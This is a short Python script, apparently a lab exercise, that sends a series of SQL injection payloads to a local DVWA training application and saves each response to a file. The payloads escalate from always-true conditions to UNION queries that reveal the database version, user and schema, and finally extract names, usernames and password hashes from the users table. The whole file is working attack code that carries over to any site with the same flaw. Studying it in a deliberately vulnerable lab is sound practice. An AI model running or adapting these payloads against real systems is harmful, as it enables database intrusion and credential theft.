import requests

# Configure necessary parameters
params_list = [
    {'name': 'Display Database Version', 'payload': "%' or 0=0 union select null, version() #"},
    {'name': 'Always True Scenario', 'payload': "' or '1'='1"},
    {'name': 'Display Database User', 'payload': "%' or 0=0 union select null, user() #"},
    {'name':'Display Database Name' , 'payload':"%' or 0=0 union select null, database() #"},
    {'name':'Display all tables in information_schema','payload':"%' and 1=0 union select null, table_name from information_schema.tables #"},
    {'name':'Display all the user tables in information_schema','payload':"%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#"},
    {'name':'Display all the columns fields in the information_schema user table','payload':"%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #"},
    {'name':'Display Column field contents','payload':"%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #"}
]

# Set cookies and security value
cookies = {"PHPSESSID": "p01rstu1v4nnp24oiahkjicn9l", "security": "low"}

# Define a function to send requests and save the response content
def send_request(url, params, cookies, output_file):
    response = requests.get(url, params=params, cookies=cookies)
    with open(output_file, 'w') as f:
        f.write("".join(map(chr, response._content)))

# Send requests for each parameter and save the response content to a file
for p in params_list:
    params = {'id': p['payload'], 'Submit': 'Submit'}
    output_file = "ReceivedhtmlResponses/"+'output_{}.html'.format(p['name'].replace(' ', '_'))
    send_request('http://localhost/dvwa/vulnerabilities/sqli/', params, cookies, output_file)